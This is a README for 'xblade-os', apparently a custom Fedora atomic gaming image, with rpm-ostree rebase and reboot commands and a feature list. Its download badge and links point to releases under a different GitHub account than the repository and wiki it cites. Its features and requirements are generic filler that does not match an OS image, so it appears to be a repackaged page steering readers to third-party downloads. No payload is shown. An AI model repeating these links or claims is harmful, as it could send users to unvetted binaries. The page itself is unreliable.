# 🎮 xblade-os - A New Way to Experience Gaming

[![Download xblade-os](https://img.shields.io/badge/Download-xblade--os-blue)](https://github.com/aklakhil/xblade-os/releases)

## 🚀 Getting Started

xblade-os gives you a fresh approach to gaming. We designed this software for an easy and engaging experience. Whether you are a casual player or a gaming enthusiast, our software aims to improve your gaming environment.

## 📥 Download & Install

To start using xblade-os, you need to download it from our releases page. 

[Visit this page to download](https://github.com/aklakhil/xblade-os/releases)

### Installation Steps

1. **Initial Rebase:**

   Start with rebasing to the unsigned image. This prepares your system by installing the necessary signing keys and policies. Open your terminal and enter this command:

   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/ktheticdev/xblade_os:latest
   ```

2. **Reboot Your System:**

   After completing the first step, reboot your system to finalize the rebase process. Use the following command:

   ```bash
   systemctl reboot
   ```

3. **Final Rebase:**

   Now, you can switch to the signed image. This step ensures you have the latest and secure version of xblade-os. Enter this command in your terminal:

   ```bash
   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/ktheticdev/xblade_os:latest
   ```

4. **Reboot Again:**

   After the final rebase, reboot your system one more time to complete the installation:

   ```bash
   systemctl reboot
   ```

### Latest Builds

The `latest` tag will always point to the most recent build available. Each build still aligns with the Fedora version detailed in `recipe.yml`.

## 🖥️ System Requirements

For the best experience with xblade-os, ensure your system meets the following requirements:

- **Operating System:** A compatible version of Fedora.
- **Memory:** At least 4 GB of RAM.
- **Storage:** Minimum of 10 GB of free space.
- **Processor:** A dual-core processor or better.

## ✨ Features

xblade-os includes a variety of features designed to enhance your gaming experience:

- **Immersive Graphics:** Enjoy high-quality visuals.
- **Stable Performance:** Designed for reliability during gaming sessions.
- **User-Friendly Interface:** Easy navigation for all users.
- **Regular Updates:** Continuous improvements and new features added.

## 🚧 Known Issues

While we strive for perfection, some users may encounter issues. We recommend checking our Issues page on GitHub for any known problems and their resolutions.

## 👥 Community and Support

Join our community for the latest updates and support:

- **GitHub Discussions:** Share feedback or ask questions.
- **Social Media:** Follow us for news and tips.
- **Documentation:** Access additional resources and guides.

## 🔗 Additional Resources

- [User Guide](https://github.com/ktheticdev/xblade-os/wiki) - A comprehensive guide to using xblade-os.
- [GitHub Repository](https://github.com/ktheticdev/xblade-os) - Check out the project source code.

For any problems or feature requests, feel free to create an issue on our GitHub repository.

[Visit this page to download](https://github.com/aklakhil/xblade-os/releases) and start your journey with xblade-os today!